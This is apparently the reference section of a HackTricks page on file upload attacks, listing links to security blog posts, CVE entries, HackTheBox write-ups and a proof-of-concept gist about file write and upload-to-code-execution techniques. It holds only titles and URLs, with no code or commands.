- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
